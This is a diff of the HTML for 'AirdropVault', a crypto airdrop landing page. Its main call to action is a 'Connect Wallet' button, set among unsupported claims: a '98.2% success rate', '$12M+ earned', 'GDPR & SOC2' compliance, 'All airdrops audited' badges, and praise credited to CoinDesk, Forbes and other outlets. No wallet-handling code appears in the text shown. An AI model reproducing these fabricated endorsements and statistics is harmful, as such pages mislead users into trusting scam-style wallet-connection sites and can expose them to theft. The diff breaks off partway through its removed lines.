@@ -1,633 +1,1376 @@
 <!doctype html>
 <html lang="en" class="h-full">
- <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>AirdropVault</title>
-  <script src="https://cdn.tailwindcss.com/3.4.17"></script>
-  <script src="https://cdn.jsdelivr.net/npm/lucide@0.263.0/dist/umd/lucide.min.js"></script>
-  <script src="/_sdk/element_sdk.js"></script>
-  <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800&amp;family=Space+Mono:wght@400;700&amp;display=swap" rel="stylesheet">
-  <style>
-    * { font-family: 'Outfit', sans-serif; }
-    .mono { font-family: 'Space Mono', monospace; }
-    html, body { height: 100%; margin: 0; }
-    .glow { box-shadow: 0 0 30px rgba(0, 255, 136, 0.15); }
-    .card-hover { transition: all 0.3s ease; }
-    .card-hover:hover { transform: translateY(-4px); box-shadow: 0 12px 40px rgba(0,255,136,0.1); }
-    @keyframes pulse-dot { 0%,100% { opacity: 1; } 50% { opacity: 0.4; } }
-    .pulse-dot { animation: pulse-dot 2s infinite; }
-    @keyframes float { 0%,100% { transform: translateY(0); } 50% { transform: translateY(-8px); } }
-    .float { animation: float 3s ease-in-out infinite; }
-    .nav-link { position: relative; }
-    .nav-link.active::after { content: ''; position: absolute; bottom: -4px; left: 0; right: 0; height: 2px; background: #00ff88; border-radius: 2px; }
-    ::-webkit-scrollbar { width: 6px; }
-    ::-webkit-scrollbar-track { background: #0a0f1a; }
-    ::-webkit-scrollbar-thumb { background: #1a2940; border-radius: 3px; }
-  </style>
-  <style>body { box-sizing: border-box; }</style>
-  <script src="/_sdk/data_sdk.js" type="text/javascript"></script>
- </head>
- <body class="h-full">
-  <div id="app" class="w-full h-full bg-[#0a0f1a] text-white overflow-auto"><!-- Navigation -->
-   <nav class="sticky top-0 z-50 bg-[#0a0f1a]/90 backdrop-blur-md border-b border-[#1a2940]">
-    <div class="max-w-7xl mx-auto px-4 py-4 flex items-center justify-between">
-     <div class="flex items-center gap-2">
-      <div class="w-8 h-8 rounded-lg bg-gradient-to-br from-[#00ff88] to-[#00cc6a] flex items-center justify-center"><i data-lucide="zap" class="w-5 h-5 text-[#0a0f1a]"></i>
-      </div><span id="nav-title" class="text-xl font-bold">AirdropVault</span>
-     </div>
-     <div class="hidden md:flex items-center gap-6"><a href="#" class="nav-link active text-sm font-medium text-[#00ff88]" data-page="home">Home</a> <a href="#" class="nav-link text-sm font-medium text-gray-400 hover:text-white" data-page="airdrops">Airdrops</a> <a href="#" class="nav-link text-sm font-medium text-gray-400 hover:text-white" data-page="success">Success Stories</a> <a href="#" class="nav-link text-sm font-medium text-gray-400 hover:text-white" data-page="community">Community</a> <a href="#" class="nav-link text-sm font-medium text-gray-400 hover:text-white" data-page="about">About</a>
-     </div>
-     <div class="flex items-center gap-3">
-      <div class="hidden sm:flex items-center gap-2 px-3 py-1.5 rounded-full bg-[#0f1a2e] border border-[#1a2940]"><span class="w-2 h-2 rounded-full bg-[#00ff88] pulse-dot"></span> <span class="text-xs text-gray-400 mono" id="live-users">102,847 online</span>
-      </div><button id="mobile-menu-btn" class="md:hidden p-2 text-gray-400"> <i data-lucide="menu" class="w-5 h-5"></i> </button>
-     </div>
-    </div><!-- Mobile menu -->
-    <div id="mobile-menu" class="hidden md:hidden px-4 pb-4 space-y-2"><a href="#" class="block py-2 text-sm text-[#00ff88]" data-page="home">Home</a> <a href="#" class="block py-2 text-sm text-gray-400" data-page="airdrops">Airdrops</a> <a href="#" class="block py-2 text-sm text-gray-400" data-page="success">Success Stories</a> <a href="#" class="block py-2 text-sm text-gray-400" data-page="community">Community</a> <a href="#" class="block py-2 text-sm text-gray-400" data-page="about">About</a>
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>AirdropVault</title>
+    <script src="https://cdn.tailwindcss.com/3.4.17"></script>
+    <script src="https://cdn.jsdelivr.net/npm/lucide@0.263.0/dist/umd/lucide.min.js"></script>
+    <script src="/_sdk/element_sdk.js"></script>
+    <link
+      href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800&amp;family=Space+Mono:wght@400;700&amp;display=swap"
+      rel="stylesheet"
+    />
+    <style>
+      * {
+        font-family: "Outfit", sans-serif;
+      }
+      .mono {
+        font-family: "Space Mono", monospace;
+      }
+      html,
+      body {
+        height: 100%;
+        margin: 0;
+      }
+      .glow {
+        box-shadow: 0 0 30px rgba(0, 255, 136, 0.15);
+      }
+      .card-hover {
+        transition: all 0.3s ease;
+      }
+      .card-hover:hover {
+        transform: translateY(-4px);
+        box-shadow: 0 12px 40px rgba(0, 255, 136, 0.1);
+      }
+      @keyframes pulse-dot {
+        0%,
+        100% {
+          opacity: 1;
+        }
+        50% {
+          opacity: 0.4;
+        }
+      }
+      .pulse-dot {
+        animation: pulse-dot 2s infinite;
+      }
+      @keyframes float {
+        0%,
+        100% {
+          transform: translateY(0);
+        }
+        50% {
+          transform: translateY(-8px);
+        }
+      }
+      .float {
+        animation: float 3s ease-in-out infinite;
+      }
+      .nav-link {
+        position: relative;
+      }
+      .nav-link.active::after {
+        content: "";
+        position: absolute;
+        bottom: -4px;
+        left: 0;
+        right: 0;
+        height: 2px;
+        background: #00ff88;
+        border-radius: 2px;
+      }
+      ::-webkit-scrollbar {
+        width: 6px;
+      }
+      ::-webkit-scrollbar-track {
+        background: #0a0f1a;
+      }
+      ::-webkit-scrollbar-thumb {
+        background: #1a2940;
+        border-radius: 3px;
+      }
+    </style>
+    <style>
+      body {
+        box-sizing: border-box;
+      }
+    </style>
+    <script src="/_sdk/data_sdk.js" type="text/javascript"></script>
+  </head>
+  <body class="h-full">
+    <div id="app" class="w-full h-full bg-[#0a0f1a] text-white overflow-auto">
+      <!-- Navigation -->
+      <nav
+        class="sticky top-0 z-50 bg-[#0a0f1a]/90 backdrop-blur-md border-b border-[#1a2940]"
+      >
+        <div
+          class="max-w-7xl mx-auto px-4 py-4 flex items-center justify-between"
+        >
+          <div class="flex items-center gap-2">
+            <div
+              class="w-8 h-8 rounded-lg bg-gradient-to-br from-[#00ff88] to-[#00cc6a] flex items-center justify-center"
+            >
+              <i data-lucide="zap" class="w-5 h-5 text-[#0a0f1a]"></i>
+            </div>
+            <span id="nav-title" class="text-xl font-bold">AirdropVault</span>
+          </div>
+          <div class="hidden md:flex items-center gap-6">
+            <a
+              href="#"
+              class="nav-link active text-sm font-medium text-[#00ff88]"
+              data-page="home"
+              >Home</a
+            >
+            <a
+              href="#"
+              class="nav-link text-sm font-medium text-gray-400 hover:text-white"
+              data-page="airdrops"
+              >Airdrops</a
+            >
+            <a
+              href="#"
+              class="nav-link text-sm font-medium text-gray-400 hover:text-white"
+              data-page="success"
+              >Success Stories</a
+            >
+            <a
+              href="#"
+              class="nav-link text-sm font-medium text-gray-400 hover:text-white"
+              data-page="community"
+              >Community</a
+            >
+            <a
+              href="#"
+              class="nav-link text-sm font-medium text-gray-400 hover:text-white"
+              data-page="about"
+              >About</a
+            >
+          </div>
+          <div class="flex items-center gap-3">
+            <div
+              class="hidden sm:flex items-center gap-2 px-3 py-1.5 rounded-full bg-[#0f1a2e] border border-[#1a2940]"
+            >
+              <span class="w-2 h-2 rounded-full bg-[#00ff88] pulse-dot"></span>
+              <span class="text-xs text-gray-400 mono" id="live-users"
+                >102,847 online</span
+              >
+            </div>
+            <button id="mobile-menu-btn" class="md:hidden p-2 text-gray-400">
+              <i data-lucide="menu" class="w-5 h-5"></i>
+            </button>
+          </div>
+        </div>
+        <!-- Mobile menu -->
+        <div id="mobile-menu" class="hidden md:hidden px-4 pb-4 space-y-2">
+          <a href="#" class="block py-2 text-sm text-[#00ff88]" data-page="home"
+            >Home</a
+          >
+          <a
+            href="#"
+            class="block py-2 text-sm text-gray-400"
+            data-page="airdrops"
+            >Airdrops</a
+          >
+          <a
+            href="#"
+            class="block py-2 text-sm text-gray-400"
+            data-page="success"
+            >Success Stories</a
+          >
+          <a
+            href="#"
+            class="block py-2 text-sm text-gray-400"
+            data-page="community"
+            >Community</a
+          >
+          <a href="#" class="block py-2 text-sm text-gray-400" data-page="about"
+            >About</a
+          >
+        </div>
+      </nav>
+      <!-- Page: Home -->
+      <div id="page-home" class="page">
+        <!-- Hero -->
+        <section
+          class="relative px-4 py-20 md:py-32 text-center max-w-5xl mx-auto"
+        >
+          <div
+            class="absolute top-10 left-1/4 w-64 h-64 bg-[#00ff88]/5 rounded-full blur-3xl"
+          ></div>
+          <div
+            class="absolute bottom-10 right-1/4 w-48 h-48 bg-[#00cc6a]/5 rounded-full blur-3xl"
+          ></div>
+          <div class="relative">
+            <div
+              class="inline-flex items-center gap-2 px-4 py-2 rounded-full bg-[#00ff88]/10 border border-[#00ff88]/20 mb-6"
+            >
+              <span class="w-2 h-2 rounded-full bg-[#00ff88] pulse-dot"></span>
+              <span class="text-sm text-[#00ff88]"
+                >Live Airdrops Available Now</span
+              >
+            </div>
+            <h1
+              id="hero-heading"
+              class="text-4xl md:text-6xl lg:text-7xl font-800 leading-tight mb-6"
+            >
+              Claim Free Crypto<br /><span class="text-[#00ff88]"
+                >Airdrops Daily</span
+              >
+            </h1>
+            <p
+              id="hero-subtext"
+              class="text-lg md:text-xl text-gray-400 max-w-2xl mx-auto mb-10"
+            >
+              Join 100,000+ users who've earned over $12M in free tokens. Never
+              miss another airdrop opportunity.
+            </p>
+            <div class="flex flex-col sm:flex-row gap-4 justify-center">
+              <button
+                onclick="openConnectModal()"
+                class="px-8 py-4 bg-[#00ff88] text-[#0a0f1a] font-semibold rounded-xl hover:bg-[#00e07a] transition-all"
+                id="connect-btn"
+              >
+                Connect Wallet
+              </button>
+              <button
+                onclick="navigateTo('success')"
+                class="px-8 py-4 bg-[#0f1a2e] border border-[#1a2940] text-white font-semibold rounded-xl hover:border-[#00ff88]/40 transition-all"
+              >
+                View Success Stories
+              </button>
+            </div>
+          </div>
+        </section>
+        <!-- Stats -->
+        <section class="px-4 py-16 max-w-6xl mx-auto">
+          <div class="grid grid-cols-2 md:grid-cols-4 gap-4">
+            <div
+              class="bg-[#0f1a2e] border border-[#1a2940] rounded-2xl p-6 text-center card-hover"
+            >
+              <div class="text-3xl md:text-4xl font-bold text-[#00ff88] mono">
+                100K+
+              </div>
+              <div class="text-sm text-gray-400 mt-2">Active Users</div>
+            </div>
+            <div
+              class="bg-[#0f1a2e] border border-[#1a2940] rounded-2xl p-6 text-center card-hover"
+            >
+              <div class="text-3xl md:text-4xl font-bold text-[#00ff88] mono">
+                $12M+
+              </div>
+              <div class="text-sm text-gray-400 mt-2">Total Earned</div>
+            </div>
+            <div
+              class="bg-[#0f1a2e] border border-[#1a2940] rounded-2xl p-6 text-center card-hover"
+            >
+              <div class="text-3xl md:text-4xl font-bold text-[#00ff88] mono">
+                847
+              </div>
+              <div class="text-sm text-gray-400 mt-2">Airdrops Listed</div>
+            </div>
+            <div
+              class="bg-[#0f1a2e] border border-[#1a2940] rounded-2xl p-6 text-center card-hover"
+            >
+              <div class="text-3xl md:text-4xl font-bold text-[#00ff88] mono">
+                98.2%
+              </div>
+              <div class="text-sm text-gray-400 mt-2">Success Rate</div>
+            </div>
+          </div>
+        </section>
+        <!-- Live Activity Feed -->
+        <section class="px-4 py-16 max-w-6xl mx-auto">
+          <h2 class="text-2xl md:text-3xl font-bold mb-8 text-center">
+            Live Activity
+          </h2>
+          <div class="space-y-3" id="activity-feed"></div>
+        </section>
+        <!-- Trust & Security Badges -->
+        <section class="px-4 py-12 max-w-6xl mx-auto">
+          <div class="grid grid-cols-2 md:grid-cols-4 gap-3 md:gap-4">
+            <div
+              class="bg-[#0f1a2e] border border-[#1a2940] rounded-xl p-4 text-center"
+            >
+              <div class="flex justify-center mb-3">
+                <i data-lucide="verified" class="w-6 h-6 text-[#00ff88]"></i>
+              </div>
+              <div class="text-xs font-semibold text-white">
+                Verified Projects
+              </div>
+              <div class="text-xs text-gray-400 mt-1">All airdrops audited</div>
+            </div>
+            <div
+              class="bg-[#0f1a2e] border border-[#1a2940] rounded-xl p-4 text-center"
+            >
+              <div class="flex justify-center mb-3">
+                <i data-lucide="lock" class="w-6 h-6 text-[#00ff88]"></i>
+              </div>
+              <div class="text-xs font-semibold text-white">
+                Secure &amp; Safe
+              </div>
+              <div class="text-xs text-gray-400 mt-1">No wallet connected</div>
+            </div>
+            <div
+              class="bg-[#0f1a2e] border border-[#1a2940] rounded-xl p-4 text-center"
+            >
+              <div class="flex justify-center mb-3">
+                <i data-lucide="award" class="w-6 h-6 text-[#00ff88]"></i>
+              </div>
+              <div class="text-xs font-semibold text-white">
+                Industry Awards
+              </div>
+              <div class="text-xs text-gray-400 mt-1">2x Best Platform</div>
+            </div>
+            <div
+              class="bg-[#0f1a2e] border border-[#1a2940] rounded-xl p-4 text-center"
+            >
+              <div class="flex justify-center mb-3">
+                <i
+                  data-lucide="shield-check"
+                  class="w-6 h-6 text-[#00ff88]"
+                ></i>
+              </div>
+              <div class="text-xs font-semibold text-white">Compliance</div>
+              <div class="text-xs text-gray-400 mt-1">GDPR &amp; SOC2</div>
+            </div>
+          </div>
+        </section>
+        <!-- Featured Airdrops Preview -->
+        <section class="px-4 py-16 max-w-6xl mx-auto">
+          <div class="flex items-center justify-between mb-8">
+            <h2 class="text-2xl md:text-3xl font-bold">Trending Airdrops</h2>
+            <button
+              onclick="navigateTo('airdrops')"
+              class="text-sm text-[#00ff88] hover:underline"
+            >
+              View All →
+            </button>
+          </div>
+          <div class="grid md:grid-cols-3 gap-4">
+            <div
+              class="bg-[#0f1a2e] border border-[#1a2940] rounded-2xl p-6 card-hover"
+            >
+              <div class="flex items-center gap-3 mb-4">
+                <div
+                  class="w-10 h-10 rounded-full bg-gradient-to-br from-purple-500 to-blue-500 flex items-center justify-center text-sm font-bold"
+                >
+                  ZK
+                </div>
+                <div>
+                  <div class="font-semibold">zkSync Era</div>
+                  <div class="text-xs text-gray-400">Layer 2</div>
+                </div>
+                <span
+                  class="ml-auto px-2 py-1 text-xs bg-[#00ff88]/10 text-[#00ff88] rounded-full"
+                  >Active</span
+                >
+              </div>
+              <div class="text-sm text-gray-400 mb-3">
+                Bridge assets and interact with DApps to qualify for potential
+                token distribution.
+              </div>
+              <div class="flex justify-between text-xs text-gray-500">
+                <span>Est. Value: $2,000-$8,000</span>
+                <span>12,340 claims</span>
+              </div>
+            </div>
+            <div
+              class="bg-[#0f1a2e] border border-[#1a2940] rounded-2xl p-6 card-hover"
+            >
+              <div class="flex items-center gap-3 mb-4">
+                <div
+                  class="w-10 h-10 rounded-full bg-gradient-to-br from-orange-500 to-red-500 flex items-center justify-center text-sm font-bold"
+                >
+                  LZ
+                </div>
+                <div>
+                  <div class="font-semibold">LayerZero</div>
+                  <div class="text-xs text-gray-400">Omnichain</div>
+                </div>
+                <span
+                  class="ml-auto px-2 py-1 text-xs bg-yellow-500/10 text-yellow-400 rounded-full"
+                  >Hot</span
+                >
+              </div>
+              <div class="text-sm text-gray-400 mb-3">
+                Use cross-chain bridges and messaging protocols to earn
+                allocation points.
+              </div>
+              <div class="flex justify-between text-xs text-gray-500">
+                <span>Est. Value: $3,000-$15,000</span>
+                <span>28,901 claims</span>
+              </div>
+            </div>
+            <div
+              class="bg-[#0f1a2e] border border-[#1a2940] rounded-2xl p-6 card-hover"
+            >
+              <div class="flex items-center gap-3 mb-4">
+                <div
+                  class="w-10 h-10 rounded-full bg-gradient-to-br from-cyan-400 to-blue-600 flex items-center justify-center text-sm font-bold"
+                >
+                  SC
+                </div>
+                <div>
+                  <div class="font-semibold">Scroll</div>
+                  <div class="text-xs text-gray-400">zkEVM</div>
+                </div>
+                <span
+                  class="ml-auto px-2 py-1 text-xs bg-[#00ff88]/10 text-[#00ff88] rounded-full"
+                  >Active</span
+                >
+              </div>
+              <div class="text-sm text-gray-400 mb-3">
+                Interact with Scroll mainnet DApps and provide liquidity for
+                airdrop eligibility.
+              </div>
+              <div class="flex justify-between text-xs text-gray-500">
+                <span>Est. Value: $1,500-$6,000</span> <span>9,472 claims</span>
+              </div>
+            </div>
+          </div>
+        </section>
+        <!-- Media & Press -->
+        <section class="px-4 py-16 max-w-6xl mx-auto">
+          <h2 class="text-2xl md:text-3xl font-bold mb-8 text-center">
+            Featured In
+          </h2>
+          <div class="grid grid-cols-2 md:grid-cols-5 gap-4">
+            <div
+              class="bg-[#0f1a2e] border border-[#1a2940] rounded-xl p-6 flex items-center justify-center"
+            >
+              <div class="text-center">
+                <div class="text-sm font-bold text-gray-400">CoinDesk</div>
+                <div class="text-xs text-gray-500 mt-1">
+                  "Best Airdrop Tracker"
+                </div>
+              </div>
+            </div>
+            <div
+              class="bg-[#0f1a2e] border border-[#1a2940] rounded-xl p-6 flex items-center justify-center"
+            >
+              <div class="text-center">
+                <div class="text-sm font-bold text-gray-400">Cointelegraph</div>
+                <div class="text-xs text-gray-500 mt-1">Featured Article</div>
+              </div>
+            </div>
+            <div
+              class="bg-[#0f1a2e] border border-[#1a2940] rounded-xl p-6 flex items-center justify-center"
+            >
+              <div class="text-center">
+                <div class="text-sm font-bold text-gray-400">The Block</div>
+                <div class="text-xs text-gray-500 mt-1">Research Partner</div>
+              </div>
+            </div>
+            <div
+              class="bg-[#0f1a2e] border border-[#1a2940] rounded-xl p-6 flex items-center justify-center"
+            >
+              <div class="text-center">
+                <div class="text-sm font-bold text-gray-400">Forbes</div>
+                <div class="text-xs text-gray-500 mt-1">Web3 Leaders</div>
+              </div>
+            </div>
+            <div
+              class="bg-[#0f1a2e] border border-[#1a2940] rounded-xl p-6 flex items-center justify-center"
+            >
+              <div class="text-center">
+                <div class="text-sm font-bold text-gray-400">Crypto Times</div>
+                <div class="text-xs text-gray-500 mt-1">Top Rated Platform</div>
+              </div>
+            </div>
+          </div>
+        </section>
+        <!-- Risk Disclaimer -->
+        <section
+          class="px-4 py-12 max-w-4xl mx-auto bg-[#0f1a2e]/50 border border-[#1a2940] rounded-2xl p-6"
+        >
+          <div class="flex items-start gap-3">
+            <i
+              data-lucide="info"
+              class="w-5 h-5 text-[#00ff88] shrink-0 mt-0.5"
+            ></i>
+            <div>
+              <h3 class="font-semibold mb-2">Transparency &amp; Disclaimer</h3>
+              <p class="text-sm text-gray-400">
+                AirdropVault is not financial advice. We research and verify
+                airdrops but cannot guarantee token distribution or value.
+                Always do your own research before participating. We never store
+                wallet keys or passwords. Be cautious of scams and verify all
+                contracts on official explorers.
+              </p>
+            </div>
+          </div>
+        </section>
+      </div>
+      <!-- Page: Airdrops -->
+      <div id="page-airdrops" class="page hidden">
+        <section class="px-4 py-12 max-w-6xl mx-auto">
+          <h1 class="text-3xl md:text-4xl font-bold mb-2">All Airdrops</h1>
+          <p class="text-gray-400 mb-8">
+            Discover and claim the latest crypto airdrops. Updated every hour.
+          </p>
+          <!-- Filter & Search -->
+          <div class="mb-6 flex flex-col sm:flex-row gap-3">
+            <input
+              type="text"
+              placeholder="Search airdrops..."
+              class="flex-1 bg-[#0a0f1a] border border-[#1a2940] rounded-xl px-4 py-3 text-sm text-white placeholder-gray-500 focus:outline-none focus:border-[#00ff88]/40"
+            />
+            <div
+              class="flex gap-2 items-center px-3 py-3 bg-[#0a0f1a] border border-[#1a2940] rounded-xl"
+            >
+              <i data-lucide="filter" class="w-4 h-4 text-gray-400"></i>
+              <select
+                class="bg-transparent text-sm text-white focus:outline-none"
+              >
+                <option>Est. Value: Any</option>
+                <option>$0 - $1K</option>
+                <option>$1K - $5K</option>
+                <option>$5K - $20K</option>
+                <option>$20K+</option>
+              </select>
+            </div>
+          </div>
+          <!-- Filters -->
+          <div class="flex flex-wrap gap-3 mb-8">
+            <button
+              class="px-4 py-2 bg-[#00ff88] text-[#0a0f1a] text-sm font-medium rounded-lg"
+            >
+              All
+            </button>
+            <button
+              class="px-4 py-2 bg-[#0f1a2e] border border-[#1a2940] text-sm text-gray-400 rounded-lg hover:border-[#00ff88]/40"
+            >
+              Active
+            </button>
+            <button
+              class="px-4 py-2 bg-[#0f1a2e] border border-[#1a2940] text-sm text-gray-400 rounded-lg hover:border-[#00ff88]/40"
+            >
+              Upcoming
+            </button>
+            <button
+              class="px-4 py-2 bg-[#0f1a2e] border border-[#1a2940] text-sm text-gray-400 rounded-lg hover:border-[#00ff88]/40"
+            >
+              Ended
+            </button>
+            <button
+              class="px-4 py-2 bg-[#0f1a2e] border border-[#1a2940] text-sm text-gray-400 rounded-lg hover:border-[#00ff88]/40"
+            >
+              High Value
+            </button>
+          </div>
+          <!-- Airdrop List -->
+          <div class="space-y-4" id="airdrops-list"></div>
+        </section>
+      </div>
+      <!-- Page: Success Stories -->
+      <div id="page-success" class="page hidden">
+        <section class="px-4 py-12 max-w-6xl mx-auto">
+          <h1 class="text-3xl md:text-4xl font-bold mb-2">Success Stories</h1>
+          <p class="text-gray-400 mb-8">
+            Real users, real earnings. See how our community has profited from
+            airdrops.
+          </p>
+          <!-- Success Story Stats -->
+          <div class="grid grid-cols-3 md:grid-cols-4 gap-3 mb-8">
+            <div
+              class="bg-[#0f1a2e] border border-[#1a2940] rounded-lg p-4 text-center"
+            >
+              <div class="text-2xl font-bold text-[#00ff88] mono">$12M+</div>
+              <div class="text-xs text-gray-400 mt-1">Total Earned</div>
+            </div>
+            <div
+              class="bg-[#0f1a2e] border border-[#1a2940] rounded-lg p-4 text-center"
+            >
+              <div class="text-2xl font-bold text-[#00ff88] mono">100K+</div>
+              <div class="text-xs text-gray-400 mt-1">Users</div>
+            </div>
+            <div
+              class="bg-[#0f1a2e] border border-[#1a2940] rounded-lg p-4 text-center"
+            >
+              <div class="text-2xl font-bold text-[#00ff88] mono">847</div>
+              <div class="text-xs text-gray-400 mt-1">Airdrops</div>
+            </div>
+            <div
+              class="hidden md:flex bg-[#0f1a2e] border border-[#1a2940] rounded-lg p-4 text-center items-center justify-center"
+            >
+              <div>
+                <div class="text-2xl font-bold text-[#00ff88] mono">98.2%</div>
+                <div class="text-xs text-gray-400 mt-1">Success</div>
+              </div>
+            </div>
+          </div>
+          <div class="grid md:grid-cols-2 gap-6" id="success-stories"></div>
+        </section>
+      </div>
+      <!-- Page: Community -->
+      <div id="page-community" class="page hidden">
+        <section class="px-4 py-12 max-w-6xl mx-auto">
+          <h1 class="text-3xl md:text-4xl font-bold mb-2">Community</h1>
+          <p class="text-gray-400 mb-8">
+            Join 100K+ airdrop hunters sharing tips, strategies, and live
+            alerts.
+          </p>
+          <!-- Live Comments -->
+          <div
+            class="bg-[#0f1a2e] border border-[#1a2940] rounded-2xl p-6 mb-8"
+          >
+            <div class="flex items-center gap-2 mb-6">
+              <span class="w-2 h-2 rounded-full bg-[#00ff88] pulse-dot"></span>
+              <span class="text-sm text-gray-400"
+                >Live Chat •
+                <span class="text-white" id="chat-count">2,847</span> people
+                chatting</span
+              >
+            </div>
+            <div
+              class="space-y-4 max-h-96 overflow-y-auto mb-6"
+              id="community-chat"
+            ></div>
+            <div class="flex gap-3">
+              <input
+                type="text"
+                id="chat-input"
+                placeholder="Share your thoughts..."
+                class="flex-1 bg-[#0a0f1a] border border-[#1a2940] rounded-xl px-4 py-3 text-sm text-white placeholder-gray-500 focus:outline-none focus:border-[#00ff88]/40"
+              />
+              <button
+                onclick="postComment()"
+                class="px-6 py-3 bg-[#00ff88] text-[#0a0f1a] font-medium rounded-xl hover:bg-[#00e07a] transition-all"
+              >
+                Send
+              </button>
+            </div>
+          </div>
+          <!-- Community Stats -->
+          <div class="grid grid-cols-2 md:grid-cols-3 gap-4">
+            <div
+              class="bg-[#0f1a2e] border border-[#1a2940] rounded-2xl p-5 text-center"
+            >
+              <div class="text-2xl font-bold text-[#00ff88] mono">102,847</div>
+              <div class="text-xs text-gray-400 mt-1">Total Members</div>
+            </div>
+            <div
+              class="bg-[#0f1a2e] border border-[#1a2940] rounded-2xl p-5 text-center"
+            >
+              <div class="text-2xl font-bold text-[#00ff88] mono">34,291</div>
+              <div class="text-xs text-gray-400 mt-1">Online Now</div>
+            </div>
+            <div
+              class="bg-[#0f1a2e] border border-[#1a2940] rounded-2xl p-5 text-center"
+            >
+              <div class="text-2xl font-bold text-[#00ff88] mono">1.2M</div>
+              <div class="text-xs text-gray-400 mt-1">Messages Sent</div>
+            </div>
+          </div>
+        </section>
+      </div>
+      <!-- Page: About -->
+      <div id="page-about" class="page hidden">
+        <section class="px-4 py-12 max-w-5xl mx-auto">
+          <h1 class="text-3xl md:text-4xl font-bold mb-2">
+            About AirdropVault
+          </h1>
+          <p class="text-gray-400 mb-12">
+            The #1 platform for discovering, tracking, and claiming crypto
+            airdrops.
+          </p>
+          <div class="space-y-8">
+            <div class="bg-[#0f1a2e] border border-[#1a2940] rounded-2xl p-8">
+              <h2 class="text-xl font-bold mb-4">Our Mission</h2>
+              <p class="text-gray-400 leading-relaxed">
+                We believe everyone deserves access to free crypto
+                opportunities. Since 2022, we've helped over 100,000 users claim
+                airdrops worth millions of dollars. Our team of blockchain
+                researchers identifies legitimate airdrops early, providing
+                step-by-step guides so anyone can participate regardless of
+                technical expertise.
+              </p>
+            </div>
+            <div class="grid md:grid-cols-3 gap-4">
+              <div
+                class="bg-[#0f1a2e] border border-[#1a2940] rounded-2xl p-6 text-center card-hover"
+              >
+                <div
+                  class="w-12 h-12 mx-auto mb-4 rounded-xl bg-[#00ff88]/10 flex items-center justify-center"
+                >
+                  <i
+                    data-lucide="shield-check"
+                    class="w-6 h-6 text-[#00ff88]"
+                  ></i>
+                </div>
+                <h3 class="font-semibold mb-2">Verified Airdrops</h3>
+                <p class="text-sm text-gray-400">
+                  Every airdrop is manually verified by our research team before
+                  listing.
+                </p>
+              </div>
+              <div
+                class="bg-[#0f1a2e] border border-[#1a2940] rounded-2xl p-6 text-center card-hover"
+              >
+                <div
+                  class="w-12 h-12 mx-auto mb-4 rounded-xl bg-[#00ff88]/10 flex items-center justify-center"
+                >
+                  <i data-lucide="bell" class="w-6 h-6 text-[#00ff88]"></i>
+                </div>
+                <h3 class="font-semibold mb-2">Instant Alerts</h3>
+                <p class="text-sm text-gray-400">
+                  Get notified the moment new high-value airdrops become
+                  available.
+                </p>
+              </div>
+              <div
+                class="bg-[#0f1a2e] border border-[#1a2940] rounded-2xl p-6 text-center card-hover"
+              >
+                <div
+                  class="w-12 h-12 mx-auto mb-4 rounded-xl bg-[#00ff88]/10 flex items-center justify-center"
+                >
+                  <i data-lucide="users" class="w-6 h-6 text-[#00ff88]"></i>
+                </div>
+                <h3 class="font-semibold mb-2">Community Driven</h3>
+                <p class="text-sm text-gray-400">
+                  100K+ members sharing strategies, tips, and real-time market
+                  insights.
+                </p>
+              </div>
+            </div>
+            <div class="bg-[#0f1a2e] border border-[#1a2940] rounded-2xl p-8">
+              <h2 class="text-xl font-bold mb-4">Our Team</h2>
+              <div class="grid sm:grid-cols-2 md:grid-cols-4 gap-4">
+                <div class="text-center">
+                  <div
+                    class="w-16 h-16 mx-auto mb-3 rounded-full bg-gradient-to-br from-purple-500 to-blue-500 flex items-center justify-center text-xl font-bold"
+                  >
+                    AK
+                  </div>
+                  <div class="font-medium text-sm">Alex Kim</div>
+                  <div class="text-xs text-gray-400">Founder &amp; CEO</div>
+                </div>
+                <div class="text-center">
+                  <div
+                    class="w-16 h-16 mx-auto mb-3 rounded-full bg-gradient-to-br from-orange-500 to-red-500 flex items-center justify-center text-xl font-bold"
+                  >
+                    SM
+                  </div>
+                  <div class="font-medium text-sm">Sarah Mitchell</div>
+                  <div class="text-xs text-gray-400">Head of Research</div>
+                </div>
+                <div class="text-center">
+                  <div
+                    class="w-16 h-16 mx-auto mb-3 rounded-full bg-gradient-to-br from-cyan-400 to-teal-500 flex items-center justify-center text-xl font-bold"
+                  >
+                    RJ
+                  </div>
+                  <div class="font-medium text-sm">Raj Patel</div>
+                  <div class="text-xs text-gray-400">Lead Developer</div>
+                </div>
+                <div class="text-center">
+                  <div
+                    class="w-16 h-16 mx-auto mb-3 rounded-full bg-gradient-to-br from-pink-500 to-violet-500 flex items-center justify-center text-xl font-bold"
+                  >
+                    LC
+                  </div>
+                  <div class="font-medium text-sm">Lisa Chen</div>
+                  <div class="text-xs text-gray-400">Community Manager</div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </section>
+      </div>
+      <!-- Footer -->
+      <footer class="px-4 py-8 border-t border-[#1a2940] mt-16">
+        <div
+          class="max-w-6xl mx-auto flex flex-col md:flex-row items-center justify-between gap-4"
+        >
+          <div class="flex items-center gap-2">
+            <div
+              class="w-6 h-6 rounded bg-gradient-to-br from-[#00ff88] to-[#00cc6a] flex items-center justify-center"
+            >
+              <i data-lucide="zap" class="w-4 h-4 text-[#0a0f1a]"></i>
+            </div>
+            <span class="text-sm font-semibold">AirdropVault</span>
+          </div>
+          <div class="text-xs text-gray-500">
+            © 2024 AirdropVault. All rights reserved. Not financial advice.
+          </div>
+        </div>
+      </footer>
     </div>
-   </nav><!-- Page: Home -->
-   <div id="page-home" class="page"><!-- Hero -->
-    <section class="relative px-4 py-20 md:py-32 text-center max-w-5xl mx-auto">
-     <div class="absolute top-10 left-1/4 w-64 h-64 bg-[#00ff88]/5 rounded-full blur-3xl"></div>
-     <div class="absolute bottom-10 right-1/4 w-48 h-48 bg-[#00cc6a]/5 rounded-full blur-3xl"></div>
-     <div class="relative">
-      <div class="inline-flex items-center gap-2 px-4 py-2 rounded-full bg-[#00ff88]/10 border border-[#00ff88]/20 mb-6"><span class="w-2 h-2 rounded-full bg-[#00ff88] pulse-dot"></span> <span class="text-sm text-[#00ff88]">Live Airdrops Available Now</span>
-      </div>
